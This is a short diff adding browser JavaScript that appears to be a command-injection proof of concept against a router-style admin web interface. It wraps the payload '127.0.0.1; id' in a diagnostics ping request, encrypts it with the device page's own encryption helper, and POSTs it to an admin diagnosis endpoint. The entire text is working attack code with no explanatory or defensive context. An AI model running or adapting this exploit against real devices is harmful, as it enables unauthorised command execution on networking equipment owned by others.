@@ -1,0 +1,8 @@
+ var payload = JSON.stringify({"method":"do","diag":{"type":"ping","addr":"127.0.0.1; id"}});                                                                                                          
+  var enc = window.tp.encrypt.encryptManager.getEncryptor().dataEncrypt(payload, true);                                                                                                               
+  $.ajax({                                                                                                                                                                                              
+    url: window.location.pathname.split('?')[0].replace(/\/[^\/]*$/, '') + '/admin/diag?form=diagnosis',
+    type: 'POST',                                                                                                                                                                                       
+    data: {sign: enc.sign, data: enc.data},                                                                                                                                                             
+    success: function(r){ console.log(JSON.stringify(r)); }                                                                                                                                             
+  });     
